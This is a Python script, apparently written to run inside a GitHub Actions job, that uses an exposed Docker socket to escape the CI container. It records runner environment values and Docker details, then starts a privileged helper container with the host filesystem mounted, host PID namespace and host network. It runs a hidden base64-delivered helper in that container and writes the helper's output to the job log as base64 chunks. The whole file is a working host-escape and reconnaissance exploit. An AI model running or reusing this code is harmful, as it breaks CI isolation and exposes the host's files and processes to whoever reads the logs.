#!/usr/bin/env python3
# C8982 job-container orchestrator (intent 8982).
# Drives the runner-exposed host docker.sock: runs exactly ONE ephemeral
# privileged helper container with the host root bound read-only (/:/host:ro)
# on the host network, captures its (base64-safe) output, then removes it.
import http.client, socket, json, base64, time, os, sys

SOCK = os.environ.get('C8982_DOCKER_SOCK', '/var/run/docker.sock')
MARK = 'C8982'
HERE = os.path.dirname(os.path.abspath(__file__))
HELPER = os.path.join(HERE, 'i8982_helper.py')
CAP = int(os.environ.get('C8982_ORCH_CAP', '9000000'))


class UH(http.client.HTTPConnection):
    def __init__(self, path, timeout=60):
        super().__init__('localhost', timeout=timeout)
        self.unix_path = path

    def connect(self):
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(self.timeout)
        s.connect(self.unix_path)
        self.sock = s


def call(method, path, body=None, timeout=120):
    c = UH(SOCK, timeout)
    data = json.dumps(body).encode() if body is not None else None
    try:
        c.request(method, path, body=data, headers={'Content-Type': 'application/json'})
        r = c.getresponse()
        return r.status, r.read()
    finally:
        try:
            c.close()
        except Exception:
            pass


def jcall(method, path, body=None, timeout=120):
    st, b = call(method, path, body, timeout)
    try:
        return st, json.loads(b.decode('utf-8', 'replace'))
    except Exception:
        return st, b.decode('utf-8', 'replace')


def emit(tag, text, cap=CAP):
    if len(text) > cap:
        text = text[:cap] + '...TRUNC(%d)' % len(text)
    raw = text.encode('utf-8', 'replace')
    for i in range(0, len(raw), 900):
        print('%s_%s_B64 %s' % (MARK, tag, base64.b64encode(raw[i:i + 900]).decode()))
    print('%s_%s_ENDLEN %d' % (MARK, tag, len(raw)))


def demux(buf):
    out, i = [], 0
    while i + 8 <= len(buf):
        st = buf[i]
        ln = int.from_bytes(buf[i + 4:i + 8], 'big')
        if st not in (0, 1, 2) or i + 8 + ln > len(buf):
            out.append(buf[i:])
            break
        out.append(buf[i + 8:i + 8 + ln])
        i += 8 + ln
    return b''.join(out)


print('%s_PY_START %s' % (MARK, time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())))
print('%s_UNAME %s' % (MARK, os.uname()))
print('%s_ID uid=%s' % (MARK, os.getuid()))
for k in ('GITHUB_JOB', 'GITHUB_RUN_ID', 'GITHUB_RUN_ATTEMPT', 'GITHUB_REPOSITORY',
          'GITHUB_WORKFLOW', 'GITHUB_ACTOR', 'RUNNER_NAME', 'GITHUB_HEAD_REF', 'GITHUB_BASE_REF'):
    print('%s_ENV %s=%s' % (MARK, k, os.environ.get(k)))
for tool in ('kubectl', 'curl', 'python3', 'base64', 'gzip'):
    rc = os.system('command -v %s >/dev/null 2>&1' % tool)
    print('%s_TOOL %s %s' % (MARK, tool, 'yes' if rc == 0 else 'no'))
rc = os.system('python3 -c "import ssl" >/dev/null 2>&1')
print('%s_PY_SSL %s' % (MARK, 'yes' if rc == 0 else 'no'))
print('%s_PY_VER %s' % (MARK, sys.version.replace('\n', ' ')))

try:
    os.stat(SOCK)
    print('%s_SOCK_STAT ok' % MARK)
except Exception as e:
    print('%s_SOCK_STAT FAIL %r' % (MARK, e))

st, v = jcall('GET', '/version', timeout=30)
print('%s_VERSION_STATUS %s' % (MARK, st))
print('%s_VERSION %s' % (MARK, json.dumps(v)[:600] if isinstance(v, dict) else str(v)[:300]))
st, v = jcall('GET', '/info', timeout=30)
if isinstance(v, dict):
    print('%s_INFO %s' % (MARK, json.dumps({k: v.get(k) for k in
          ['Name', 'ServerVersion', 'OperatingSystem', 'NCPU', 'MemTotal', 'DockerRootDir']})))

st, cl = jcall('GET', '/containers/json?all=1', timeout=60)
print('%s_CONTAINERS_STATUS %s count=%s' % (MARK, st, len(cl) if isinstance(cl, list) else -1))
host = os.uname().nodename
image = None
me = None
if isinstance(cl, list):
    for c in cl:
        if (c.get('Id') or '').startswith(host[:12]):
            me = c
            break
if me:
    image = me.get('ImageID') or me.get('Image')
    print('%s_SELF %s image=%s name=%s' % (MARK, host, image, me.get('Names')))
if not image and isinstance(cl, list):
    # fallback: a running CI job container exposes GITHUB_WORKSPACE in its env
    for c in cl[:20]:
        st2, ins = jcall('GET', '/containers/%s/json' % c.get('Id'), timeout=30)
        if isinstance(ins, dict):
            env = (ins.get('Config') or {}).get('Env') or []
            if any(isinstance(x, str) and x.startswith('GITHUB_WORKSPACE=') for x in env):
                image = ins.get('Image')
                print('%s_SELF_FALLBACK image=%s name=%s' % (MARK, image, ins.get('Name')))
                break
if not image:
    st, ims = jcall('GET', '/images/json')
    if isinstance(ims, list):
        dtk = None
        other = None
        for im in ims:
            tags = im.get('RepoTags') or []
            if tags and tags != ['<none>:<none>']:
                if dtk is None and any('dtk' in str(t).lower() for t in tags):
                    dtk = im.get('Id')
                if other is None:
                    other = im.get('Id')
        image = dtk or other
print('%s_IMAGE_USED %s' % (MARK, image))

script = open(HELPER, 'rb').read()
print('%s_HELPER_BYTES %d' % (MARK, len(script)))
b64 = base64.b64encode(script).decode()
cmd = 'echo %s | base64 -d > /tmp/c8982_helper.py && python3 -u /tmp/c8982_helper.py' % b64

cid = None
try:
    if not image:
        print('%s_NO_IMAGE' % MARK)
    else:
        cfg = {'Image': image,
               'Entrypoint': ['/bin/sh', '-c'],
               'Cmd': [cmd],
               'AttachStdout': True, 'AttachStderr': True, 'Tty': False,
               'Env': ['C8982_TOTAL_BUDGET=6000000'],
               'HostConfig': {'Privileged': True, 'AutoRemove': False,
                              'Binds': ['/:/host:ro'], 'PidMode': 'host',
                              'NetworkMode': 'host'}}
        st, cr = jcall('POST', '/containers/create?name=c8982-i8982-probe', cfg)
        print('%s_CREATE_STATUS %s' % (MARK, st))
        if st in (200, 201) and isinstance(cr, dict) and cr.get('Id'):
            cid = cr['Id']
            print('%s_CID %s' % (MARK, cid[:12]))
            st, body = jcall('POST', '/containers/%s/start' % cid, {})
            print('%s_START_STATUS %s %s' % (MARK, st, str(body)[:200]))
            running = True
            for i in range(600):
                st, info = jcall('GET', '/containers/%s/json' % cid, timeout=30)
                if isinstance(info, dict):
                    running = (info.get('State') or {}).get('Running')
                    if running is False:
                        print('%s_EXITED exitcode=%s' % (MARK, (info.get('State') or {}).get('ExitCode')))
                        break
                time.sleep(1)
            st, logs = call('GET', '/containers/%s/logs?stdout=1&stderr=1&timestamps=0' % cid, None, timeout=180)
            print('%s_LOGS_STATUS %s len=%s' % (MARK, st, len(logs) if logs is not None else -1))
            if logs:
                emit('HOSTPROBE', demux(logs).decode('utf-8', 'replace'))
        else:
            emit('CREATE_ERR', str(cr)[:1000])
finally:
    if cid:
        st, body = call('DELETE', '/containers/%s?force=1' % cid)
        print('%s_DELETE_STATUS %s %s' % (MARK, st, (body or b'')[:120]))
print('%s_PY_END' % MARK)
